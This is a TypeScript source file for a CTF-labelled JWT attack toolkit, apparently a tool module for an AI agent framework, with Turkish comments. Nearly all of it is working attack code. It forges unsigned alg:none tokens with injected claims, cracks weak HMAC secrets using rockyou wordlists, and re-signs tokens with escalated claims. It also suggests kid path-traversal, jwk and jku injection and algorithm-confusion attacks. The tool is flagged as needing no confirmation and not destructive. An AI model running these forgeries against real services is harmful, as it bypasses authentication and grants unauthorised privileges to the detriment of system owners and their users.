/**
 * @fileoverview Fetih CTF JWT Toolkit (pure Node — npm dep yok)
 * Eylemler: decode, alg_none (saldırı payload üret), brute (HMAC zayıf secret crack),
 * forge (custom claim ile yeni JWT imzala), analyze (kid/alg confusion önerileri).
 */

import { createHmac } from 'crypto';
import { existsSync, readFileSync, statSync } from 'fs';
import { homedir } from 'os';
import type { ToolDefinition, ToolResult } from '../../types.js';

// ─── base64url helpers ──────────────────────────────────────────────────────

function b64urlDecode(input: string): Buffer {
  const padded = input.replace(/-/g, '+').replace(/_/g, '/') + '='.repeat((4 - input.length % 4) % 4);
  return Buffer.from(padded, 'base64');
}
function b64urlEncode(input: Buffer): string {
  return input.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

// ─── Decode ─────────────────────────────────────────────────────────────────

export interface JwtParts {
  ok: boolean;
  header: Record<string, unknown> | null;
  payload: Record<string, unknown> | null;
  signature: string;
  raw: string;
  error?: string;
}

export function decodeJwt(token: string): JwtParts {
  const parts = token.trim().split('.');
  if (parts.length < 2 || parts.length > 3) {
    return { ok: false, header: null, payload: null, signature: '', raw: token, error: 'JWT format değil (3 parça beklenir: header.payload.signature)' };
  }
  try {
    const header = JSON.parse(b64urlDecode(parts[0]!).toString('utf8')) as Record<string, unknown>;
    const payload = JSON.parse(b64urlDecode(parts[1]!).toString('utf8')) as Record<string, unknown>;
    return { ok: true, header, payload, signature: parts[2] ?? '', raw: token };
  } catch (err) {
    return { ok: false, header: null, payload: null, signature: '', raw: token, error: `Decode hatası: ${String(err).slice(0, 150)}` };
  }
}

// ─── alg:none Saldırı ───────────────────────────────────────────────────────

export function algNoneAttack(token: string, claimOverrides?: Record<string, unknown>): { ok: boolean; forged: string; explanation: string } {
  const parsed = decodeJwt(token);
  if (!parsed.ok || !parsed.header || !parsed.payload) {
    return { ok: false, forged: '', explanation: parsed.error ?? 'Decode başarısız' };
  }
  const newHeader = { ...parsed.header, alg: 'none' };
  const newPayload = { ...parsed.payload, ...claimOverrides };
  const headerB64 = b64urlEncode(Buffer.from(JSON.stringify(newHeader)));
  const payloadB64 = b64urlEncode(Buffer.from(JSON.stringify(newPayload)));
  // alg:none → signature boş
  const forged = `${headerB64}.${payloadB64}.`;
  return {
    ok: true,
    forged,
    explanation: 'alg:none saldırısı. Server signature doğrulamasını atlıyorsa kabul eder. Test: Authorization: Bearer ' + forged,
  };
}

// ─── HMAC Secret Brute-Force ────────────────────────────────────────────────

const ROCKYOU_PATHS = [
  '/usr/share/wordlists/rockyou.txt',
  '/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt',
  `${homedir()}/.fetih/wordlists/rockyou.txt`,
  `${homedir()}/wordlists/rockyou.txt`,
];

const BUILTIN_JWT_SECRETS = [
  'secret', 'password', 'admin', 'root', '123456', 'qwerty', 'jwt', 'jsonwebtoken',
  'your-256-bit-secret', 'your-secret-key', 'change-me', 'changeme', 'changethis',
  'JWT_SECRET', 'jwt_secret', 'mysecret', 'mysecretkey', 'my-secret', 'super-secret',
  'token', 'authentication', 'authorization', 'fetih', 'flag', 'ctf',
  'test', 'test123', 'testing', 'demo', 'sample', 'example', 'temp', 'temp123',
  'key', 'apikey', 'api-key', 'api_key', 'private', 'private-key', 'public',
  '1234', '12345', '1234567', '12345678', '123456789', 'pass', 'pass123',
  'P@ssw0rd', 'Passw0rd', 'password1', 'password123', 'admin123', 'root123',
  'NULL', 'null', 'none', 'undefined', 'default', 'iloveyou', 'sunshine',
];

function hmacSha(algo: 'sha256' | 'sha384' | 'sha512', secret: string, data: string): string {
  return b64urlEncode(createHmac(algo, secret).update(data).digest());
}

export interface BruteResult {
  ok: boolean;
  cracked: string | null;
  attempts: number;
  wordlist: string;
  alg: string;
  notes: string[];
}

export async function bruteForceJwtSecret(token: string, maxAttempts = 100_000): Promise<BruteResult> {
  const parsed = decodeJwt(token);
  if (!parsed.ok) {
    return { ok: false, cracked: null, attempts: 0, wordlist: '', alg: 'unknown', notes: [parsed.error ?? 'decode fail'] };
  }
  const alg = String((parsed.header as { alg?: string }).alg ?? 'unknown').toLowerCase();
  if (!['hs256', 'hs384', 'hs512'].includes(alg)) {
    return {
      ok: false, cracked: null, attempts: 0, wordlist: '', alg,
      notes: [`HMAC değil (${alg}). Brute-force sadece HS256/384/512 için. RSA/ES için key dosyası gerek.`],
    };
  }

  const algoMap: Record<string, 'sha256' | 'sha384' | 'sha512'> = { hs256: 'sha256', hs384: 'sha384', hs512: 'sha512' };
  const algoName = algoMap[alg]!;
  const parts = token.trim().split('.');
  const signingInput = `${parts[0]}.${parts[1]}`;
  const targetSig = parts[2] ?? '';

  // Wordlist seç
  let wordlist = '<dahili>';
  let words: string[] = BUILTIN_JWT_SECRETS;
  for (const p of ROCKYOU_PATHS) {
    if (existsSync(p)) {
      try {
        wordlist = `${p} (${(statSync(p).size / 1024 / 1024).toFixed(1)} MB)`;
        const content = readFileSync(p, 'utf8');
        words = content.split('\n').slice(0, maxAttempts);
        break;
      } catch { /* skip */ }
    }
  }

  let attempts = 0;
  for (const word of words) {
    attempts++;
    if (attempts > maxAttempts) break;
    const clean = word.trim();
    if (!clean) continue;
    if (hmacSha(algoName, clean, signingInput) === targetSig) {
      return { ok: true, cracked: clean, attempts, wordlist, alg, notes: [`Eşleşme bulundu: ${attempts} deneme`] };
    }
  }
  return { ok: false, cracked: null, attempts, wordlist, alg, notes: [`${attempts} kelime denendi`] };
}

// ─── Forge (secret biliniyorsa custom claim ile imzala) ─────────────────────

export function forgeJwt(secret: string, claimOverrides: Record<string, unknown>, originalToken?: string, alg: 'HS256' | 'HS384' | 'HS512' = 'HS256'): string {
  const algoMap: Record<string, 'sha256' | 'sha384' | 'sha512'> = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };
  const algoName = algoMap[alg]!;
  const baseHeader = originalToken
    ? { ...(decodeJwt(originalToken).header ?? {}), alg, typ: 'JWT' }
    : { alg, typ: 'JWT' };
  const basePayload = originalToken
    ? (decodeJwt(originalToken).payload ?? {})
    : {};
  const payload = { ...basePayload, ...claimOverrides };
  const headerB64 = b64urlEncode(Buffer.from(JSON.stringify(baseHeader)));
  const payloadB64 = b64urlEncode(Buffer.from(JSON.stringify(payload)));
  const sig = hmacSha(algoName, secret, `${headerB64}.${payloadB64}`);
  return `${headerB64}.${payloadB64}.${sig}`;
}

// ─── Analiz: kid/alg confusion ───────────────────────────────────────────────

function analyzeJwt(token: string): string[] {
  const parsed = decodeJwt(token);
  if (!parsed.ok || !parsed.header) return [parsed.error ?? 'decode fail'];
  const notes: string[] = [];
  const header = parsed.header as Record<string, unknown>;
  const alg = String(header.alg ?? '').toLowerCase();

  if (alg === 'none' || alg === '') {
    notes.push('⚠️  alg=none — server signature doğrulamasını atlıyorsa direkt forge mümkün');
  }
  if (alg.startsWith('hs')) {
    notes.push('• HMAC algorithm — zayıf secret için brute-force dene (action=brute)');
    notes.push('• Algorithm confusion: server RSA bekleyip HMAC kabul ederse, public key\'i HMAC secret olarak kullan');
  }
  if (alg.startsWith('rs') || alg.startsWith('es')) {
    notes.push('• Asymmetric — public key gerekli, secret brute-force imkansız');
    notes.push('• jwk header injection: header\'a kendi public key\'ini koy (CVE-2018-0114)');
    notes.push('• kid header parameter injection: ?kid=../../../dev/null + boş secret');
  }
  if (header.kid !== undefined) {
    notes.push(`• kid header bulundu: ${JSON.stringify(header.kid)} — path traversal/SQL inj dene`);
  }
  if (header.jku !== undefined) {
    notes.push(`• jku (JSON Web Key URL) — kontrollü URL'e yönlendir, kendi key'ini sun`);
  }
  if (header.x5u !== undefined) {
    notes.push(`• x5u (X.509 URL) — SSRF + key control vektörü`);
  }
  if (parsed.payload) {
    const payload = parsed.payload as Record<string, unknown>;
    if (payload.exp && typeof payload.exp === 'number') {
      const expDate = new Date(payload.exp * 1000);
      const expired = expDate < new Date();
      notes.push(`• exp: ${expDate.toISOString()} ${expired ? '(SÜRESİ DOLMUŞ)' : '(geçerli)'}`);
    }
    if ('admin' in payload || 'role' in payload || 'isAdmin' in payload) {
      notes.push('• payload\'da rol/admin claim var — değiştirip forge dene');
    }
  }
  return notes;
}

// ─── Tool Tanımı ─────────────────────────────────────────────────────────────

export const ctfJwtTool: ToolDefinition = {
  name: 'ctf_jwt',
  description:
    'CTF JWT toolkit. Eylemler: decode (header+payload göster), analyze (saldırı vektörleri öner), ' +
    'alg_none (alg:none saldırısı için forge), brute (HMAC zayıf secret crack — rockyou destekli), ' +
    'forge (secret ile custom claim imzala). HS256/384/512, RS256, ES256, none destekler.',
  inputSchema: {
    type: 'object',
    properties: {
      action: { type: 'string', enum: ['decode', 'analyze', 'alg_none', 'brute', 'forge'] },
      token: { type: 'string', description: 'JWT token (header.payload.signature)' },
      claims: { type: 'object', description: 'forge/alg_none için override claim\'ler (örn. {"admin":true})' },
      secret: { type: 'string', description: 'forge için imza secret' },
      alg: { type: 'string', enum: ['HS256', 'HS384', 'HS512'], description: 'forge için algoritma' },
    },
    required: ['action', 'token'],
  },
  isDestructive: false,
  requiresConfirmation: false,

  async execute(input: Record<string, unknown>): Promise<ToolResult> {
    const action = String(input['action'] ?? '');
    const token = String(input['token'] ?? '').trim();
    if (!token) return { output: 'token gerekli', isError: true };

    switch (action) {
      case 'decode': {
        const r = decodeJwt(token);
        if (!r.ok) return { output: `Hata: ${r.error}`, isError: true };
        return {
          output: [
            '┌─ JWT DECODE ────────────────────────────────────────────────┐',
            'HEADER:',
            JSON.stringify(r.header, null, 2),
            '',
            'PAYLOAD:',
            JSON.stringify(r.payload, null, 2),
            '',
            `SIGNATURE (base64url): ${r.signature}`,
          ].join('\n'),
          isError: false,
        };
      }
      case 'analyze': {
        const notes = analyzeJwt(token);
        return { output: ['Saldırı vektörleri:', ...notes.map(n => `  ${n}`)].join('\n'), isError: false };
      }
      case 'alg_none': {
        const claims = (input['claims'] ?? {}) as Record<string, unknown>;
        const r = algNoneAttack(token, claims);
        return {
          output: r.ok
            ? `Forged token (alg=none):\n${r.forged}\n\n${r.explanation}`
            : `Hata: ${r.explanation}`,
          isError: !r.ok,
        };
      }
      case 'brute': {
        const r = await bruteForceJwtSecret(token);
        const lines = [
          '┌─ JWT HMAC BRUTE-FORCE ──────────────────────────────────────┐',
          `│ Algoritma: ${r.alg}`,
          `│ Wordlist : ${r.wordlist}`,
          `│ Deneme   : ${r.attempts}`,
        ];
        if (r.cracked) lines.push(`│ 🎯 SECRET: ${r.cracked}`);
        else lines.push(`│ ✗ Bulunamadı`);
        lines.push('└─────────────────────────────────────────────────────────────┘');
        r.notes.forEach(n => lines.push(`  ${n}`));
        return { output: lines.join('\n'), isError: !r.ok };
      }
      case 'forge': {
        const secret = String(input['secret'] ?? '');
        if (!secret) return { output: 'forge için secret gerekli', isError: true };
        const claims = (input['claims'] ?? {}) as Record<string, unknown>;
        const alg = String(input['alg'] ?? 'HS256') as 'HS256' | 'HS384' | 'HS512';
        const forged = forgeJwt(secret, claims, token, alg);
        return { output: `Forged JWT (${alg}):\n${forged}`, isError: false };
      }
      default:
        return { output: `Bilinmeyen eylem: ${action}`, isError: true };
    }
  },
};
